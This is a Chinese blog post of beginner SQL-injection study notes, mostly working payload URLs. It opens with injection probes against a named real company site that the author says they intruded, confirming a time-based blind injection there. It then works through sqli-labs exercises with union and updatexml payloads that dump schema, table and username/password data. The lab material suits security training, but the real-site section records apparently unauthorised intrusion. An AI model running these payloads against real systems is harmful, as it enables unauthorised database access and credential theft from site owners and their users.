+![image-20260309143206961](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309143206961.png)
+
+![image-20260309143231785](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309143231785.png)
+
+由于入侵的站点安全性一般，故而我们可以直接使用f12来查看外部站点密码
+
+![image-20260309143526606](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309143526606.png)
+
+然后查看是否有注入点，或者上传图片是否能够传shell
+
+![image-20260309143830991](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309143830991.png)
+
+在这里出现了id和site.id，故而可以想到这里可能会存在注入点
+
+![image-20260309143922780](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309143922780.png)
+
+--- 为什么会出现注入点 --> 因为在站点加入单引号使其闭合的时候，出现了报错，故而证明多出来一个单引号，我们加入的单引号和前面存在的单引号发生闭合但是它本身还有一个单引号 --- >逃逸出来了单引号
+
+--- 尝试注入
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webmanage.kidcastle.com.cn/Article/Edit?id=3087&amp;site_id=3%27%20order%20by%203--+</span><br></pre></td></tr></table></figure>
+
+![image-20260309144458139](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309144458139.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webmanage.kidcastle.com.cn/Article/Edit?id=3087&amp;site_id=3%27%20order%20by%204--+</span><br></pre></td></tr></table></figure>
+
+![image-20260309144515457](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309144515457.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webmanage.kidcastle.com.cn/Article/Edit?id=3087&amp;site_id=3%27%20order%20by%206--+</span><br></pre></td></tr></table></figure>
+
+![image-20260309144603146](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309144603146.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webmanage.kidcastle.com.cn/Article/Edit?id=3087&amp;site_id=3%27%20order%20by%2010--+</span><br></pre></td></tr></table></figure>
+
+![image-20260309144617391](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309144617391.png)
+
+--- 可以知道，上述站点的列是4列
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webmanage.kidcastle.com.cn/Article/Edit?id=3087&amp;site_id=-3%27%20union%20%20select%201,2,3,4--+</span><br></pre></td></tr></table></figure>
+
+![image-20260309144811269](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309144811269.png)
+
+--- 注入以后存在拦截，前端没有回显，和我们的靶场第一关不一样，配置的靶场没有拦截，麻烦一点 --- 进行盲注
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webmanage.kidcastle.com.cn/Article/Edit?id=3087&amp;site_id=-3%27%20and%20if(now()=sysdate(),sleep(3),0)--+</span><br></pre></td></tr></table></figure>
+
+--- 盲注指令（沉睡三秒）
+
+![image-20260309145147738](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309145147738.png)
+
+--- 代码有问题，我们在这里没有使用union，故而不应该使用-3，现在更改站点指令
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webmanage.kidcastle.com.cn/Article/Edit?id=3087&amp;site_id=3%27%20and%20if(now()=sysdate(),sleep(3),0)--+</span><br></pre></td></tr></table></figure>
+
+--- 成功沉睡，但是时间超过三秒，故而证明存在盲注
+
+**真实案例，多查看资料去思考sql注入环境**
+
+### 7.报错注入
+
+**常用函数：updatexml()  -- 三个参数 ; extractvalue  --两个参数 ; floor**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-1/?id=-1&#x27; and updatexml(1,1,1)--+</span><br></pre></td></tr></table></figure>
+
+--- 将单引号闭合成功
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-1/?id=-1&#x27; and updatexml(1,concat(0x7e,user(),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+![image-20260309162509880](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309162509880.png)
+
+--- 通过报错，直接注入出所需要的表单结果 --- **使用连接字符保持完整**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-1/?id=-1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username,0x3a,password)from%20users),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+--- 出结果但不完整 --> 可以先查username在查password，用limit 0,1来查，但是会很麻烦
+
+![image-20260311085329029](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260311085329029.png)
+
+--- xpath的路径长度最多为21位
+
+--> 故而我们转换思路，直接使用substr截取来获取
+
+## 3.常见破解思路
+
+mssql 我没学过   
+
+bp爆破
+
+security 有没有 
+
+一种 bp爆破
+
+二种 python 暴力破解 两个for循环 O^2 复杂度   很慢
+
+三种 python 二分查找 logo 效率显著提高  比较快
+
+四种：报错注入
+
+## 4.靶场第二关
+
+--- **数字型注入**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+--- 如何直接知晓注入点？ ---> 现在站点后面加上单引号，查看页面前端是否会发生变化/1=1/1=2/扫描器   ----->   让他能够报错
+
+传入id=1查看是否回显
+
+![image-20260316142231882](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316142231882.png)
+
+然后输入1=1 和1=2来查看回显类型   ---- >输入1=1时回显正常，1=2时回显出错
+
+---- > 数值查询
+
+![image-20260316142540374](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316142540374.png)
+
+然后用order by来查询表的字段数（列数）
+
+![image-20260316142820668](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316142820668.png)
+
+![image-20260316142832948](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316142832948.png)
+
+---- >三列
+
+然后用union select 1,2,3 联合查询来查看页面是否有显示
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-2/?id=1%20and%201=2%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
+
+---- 两个显示位
+
+![image-20260316143156750](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316143156750.png)
+
+然后查看库名和版本号
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqlilabs/Less-2/?id=1%20and%201=2%20union%20select%201,database(),version()--+</span><br></pre></td></tr></table></figure>
+
+![image-20260316143308502](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316143308502.png)
+
+然后用爆破语句来查看数据库里面的数据库名
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-2/?id=1%20and%201=2%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%20--%20limit%200,1--+</span><br></pre></td></tr></table></figure>
+
+![image-20260316143543155](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316143543155.png)
+
+然后使用group_concat()函数全部查询sercity数据库
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-2/?id=1%20and%201=2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27%20--+</span><br></pre></td></tr></table></figure>
+
+![image-20260316143654216](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316143654216.png)
+
+然后使用limit函数逐一查询
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-2/?id=1%20and%201=2%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1%20--+</span><br></pre></td></tr></table></figure>
+
+![image-20260316143944944](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316143944944.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-2/?id=1%20and%201=2%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1%20--+</span><br></pre></td></tr></table></figure>
+
+![image-20260316144013881](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316144013881.png)
+
+![image-20260316144044977](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316144044977.png)
+
+![image-20260316144115115](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316144115115.png)
+
+---- >由于刚刚查到只有三列故而查四次，明显users存的用户密码
+
+然后查表列的内容重复上述爆破
+
+最后
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-2/?id=1%20and%201=2%20union%20select%201,group_concat(username),%20group_concat(password)%20from%20security.users%20--+</span><br></pre></td></tr></table></figure>
+
+![image-20260316144348813](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316144348813.png)
+
+## 5.靶场第三关
+
+**数字型注入**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+--- 闭合方式加了单引号
+
+使用靶场一二关的操作，进行操作
+
+---寻找注入点
+
+![image-20260316144944461](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316144944461.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-3/?id=1%27)%20and%201=2--+</span><br></pre></td></tr></table></figure>
+
+![image-20260316145133485](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316145133485.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-3/?id=1%27)%20order%20by%203--+</span><br></pre></td></tr></table></figure>
+
+---字段仍为3
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-3/?id=1%27)%20and%201=2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()%20--+</span><br></pre></td></tr></table></figure>
+
+--- 不爆破数据库直接爆破数据库名
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-3/?id=1%27)%20and%201=2%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%20--+</span><br></pre></td></tr></table></figure>
+
+--- 查users表里面的列名
+
+![image-20260316150132196](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316150132196.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-3/?id=1%27)%20and%201=2%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</span><br></pre></td></tr></table></figure>
+
+## 6.靶场第四关
+
+**数字型注入**
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+依旧改变注入点，其实前四关都是数字型注入手法都一样，这里加了双引号罢了？
+
+![image-20260316152950713](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316152950713.png)
+
+![image-20260316153149282](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316153149282.png)
+
+![image-20260316153229977](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316153229977.png)
+
+![image-20260316153307998](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316153307998.png)
+
+![image-20260316153517194](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316153517194.png)
+
+![image-20260316153706193](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316153706193.png)
+
+![image-20260316154223711](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260316154223711.png)
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2026-03-24 16:04:40" itemprop="dateModified" datetime="2026-03-24T16:04:40+08:00">2026-03-24</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/xxx/images/wechatpay.png" alt="X 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/xxx/images/alipay.png" alt="X 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/xxx/images/paypal.png" alt="X 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>X <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://szm200543-ux.github.io/xxx/2026/03/23/%E6%B8%97%E9%80%8F1-5/" title="网络安全前五天学习笔记">https://szm200543-ux.github.io/xxx/2026/03/23/渗透1-5/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/xxx/2026/03/23/hello-world/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexe4oykj20zk0m87ji.jpg" title="Hello World">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>Hello World</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AC%AC%E4%B8%80%E5%A4%A9"><span class="toc-number">1.</span> <span class="toc-text">一、第一天</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1.安全相关介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E6%96%B9%E5%90%91"><span class="toc-number">1.1.1.</span> <span class="toc-text">学习方向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AI"><span class="toc-number">1.1.2.</span> <span class="toc-text">AI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.3.</span> <span class="toc-text">基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ubuntu%E8%BF%9C%E7%A8%8Bssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text">2.ubuntu远程ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-nginx"><span class="toc-number">1.3.</span> <span class="toc-text">3.nginx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96%E5%8C%85"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.安装依赖包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%89%E8%A3%85nginx"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.安装nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BC%96%E8%AF%91nginx"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.编译nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%90%AF%E5%8A%A8nginx"><span class="toc-number">1.3.4.</span> <span class="toc-text">4.启动nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%AE%BF%E9%97%AEnginx"><span class="toc-number">1.3.5.</span> <span class="toc-text">5.访问nginx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-php"><span class="toc-number">1.4.</span> <span class="toc-text">3.php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A2%9E%E5%8A%A0%E6%BA%90%E5%9C%B0%E5%9D%80"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.增加源地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%89%E8%A3%85php"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.安装php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%85%8D%E7%BD%AEphp-fpm"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.配置php-fpm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%90%AF%E5%8A%A8php-fpm"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.启动php-fpm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.5.</span> <span class="toc-text">5.常见攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E9%A9%AC"><span class="toc-number">1.5.1.</span> <span class="toc-text">挂马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E"><span class="toc-number">1.5.2.</span> <span class="toc-text">挖洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3"><span class="toc-number">1.5.3.</span> <span class="toc-text">加壳</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA"><span class="toc-number">1.5.4.</span> <span class="toc-text">溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">1.5.5.</span> <span class="toc-text">缓冲区溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.6.</span> <span class="toc-text">注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.7.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.5.8.</span> <span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E8%84%B1%E5%A3%B3"><span class="toc-number">1.5.9.</span> <span class="toc-text">软件脱壳</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-number">1.5.10.</span> <span class="toc-text">免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.5.11.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.12.</span> <span class="toc-text">洪水攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SYN%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.13.</span> <span class="toc-text">SYN攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DoS%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.14.</span> <span class="toc-text">DoS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DDoS%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.15.</span> <span class="toc-text">DDoS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.16.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.17.</span> <span class="toc-text">反弹端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"><span class="toc-number">1.5.18.</span> <span class="toc-text">网络钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.19.</span> <span class="toc-text">鱼叉攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B2%B8%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.20.</span> <span class="toc-text">钓鲸攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.21.</span> <span class="toc-text">水坑攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%97%85%E6%8E%A2"><span class="toc-number">1.5.22.</span> <span class="toc-text">嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#APT%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.23.</span> <span class="toc-text">APT攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#C2"><span class="toc-number">1.5.24.</span> <span class="toc-text">C2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.25.</span> <span class="toc-text">供应链攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="toc-number">1.5.26.</span> <span class="toc-text">社会工程学</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E7%AB%99"><span class="toc-number">1.5.27.</span> <span class="toc-text">拿站</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">1.5.28.</span> <span class="toc-text">渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.5.29.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%B3%E6%9D%BF"><span class="toc-number">1.5.30.</span> <span class="toc-text">跳板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A9%AC%E2%80%93%E6%B7%98%E6%B1%B0"><span class="toc-number">1.5.31.</span> <span class="toc-text">网马–淘汰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%B1%E5%AD%90%E2%80%93%E6%B7%98%E6%B1%B0"><span class="toc-number">1.5.32.</span> <span class="toc-text">箱子–淘汰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E9%A1%B5%E2%80%93%E6%B7%98%E6%B1%B0"><span class="toc-number">1.5.33.</span> <span class="toc-text">黑页–淘汰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%97%E9%93%BE%E2%80%93%E6%B7%98%E6%B1%B0"><span class="toc-number">1.5.34.</span> <span class="toc-text">暗链–淘汰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%96%E5%BA%93"><span class="toc-number">1.5.35.</span> <span class="toc-text">拖库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%92%9E%E5%BA%93"><span class="toc-number">1.5.36.</span> <span class="toc-text">撞库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%BA%93"><span class="toc-number">1.5.37.</span> <span class="toc-text">暴库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CC%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.38.</span> <span class="toc-text">CC攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebShell"><span class="toc-number">1.5.39.</span> <span class="toc-text">WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.40.</span> <span class="toc-text">跨站攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.41.</span> <span class="toc-text">中间人攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%96%85%E7%BE%8A%E6%AF%9B"><span class="toc-number">1.5.42.</span> <span class="toc-text">薅羊毛</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%95%86%E4%B8%9A%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%BB%E5%87%BB%EF%BC%88BEC"><span class="toc-number">1.5.43.</span> <span class="toc-text">商业电子邮件攻击（BEC)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B5%E4%BF%A1%E8%AF%88%E9%AA%97"><span class="toc-number">1.5.44.</span> <span class="toc-text">电信诈骗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%80%E7%8C%AA%E7%9B%98"><span class="toc-number">1.5.45.</span> <span class="toc-text">杀猪盘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ARP%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.46.</span> <span class="toc-text">ARP攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.47.</span> <span class="toc-text">欺骗攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.48.</span> <span class="toc-text">域名劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shellcode"><span class="toc-number">1.5.49.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%A9%E7%90%86%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.50.</span> <span class="toc-text">物理攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E9%82%AE%E4%BB%B6"><span class="toc-number">1.5.51.</span> <span class="toc-text">垃圾邮件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-vscode%E4%B8%ADphpdebug%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.6.</span> <span class="toc-text">6.vscode中phpdebug环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%9A%84%E5%BA%95%E5%B1%82%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">1.6.1.</span> <span 